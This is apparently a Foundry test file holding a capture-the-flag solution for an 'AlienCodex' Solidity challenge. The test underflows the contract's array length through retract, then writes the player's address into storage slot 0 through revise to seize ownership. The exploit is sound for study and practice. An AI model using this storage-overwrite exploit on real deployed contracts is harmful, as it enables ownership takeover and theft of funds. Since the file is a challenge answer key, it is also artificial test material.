// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IAlienCodex {
    function make_contact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;

    function owner() external view returns (address);
}

contract AlienCodexTest is Test {
    IAlienCodex public target;
    address player = vm.addr(1);

    function setUp() public {
        address deployment = deployCode("19-AlienCodex.sol:AlienCodex");
        target = IAlienCodex(deployment);

        vm.label(address(target), "Challenge");
        vm.label(address(player), "Player");
    }

    function testAlienCodex() public {
        vm.startPrank(address(player));

        target.make_contact();
        target.retract();

        uint256 index = ((2**256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        target.revise(index, bytes32(uint256(uint160(player))));

        assertTrue(target.owner() == player);
    }
}
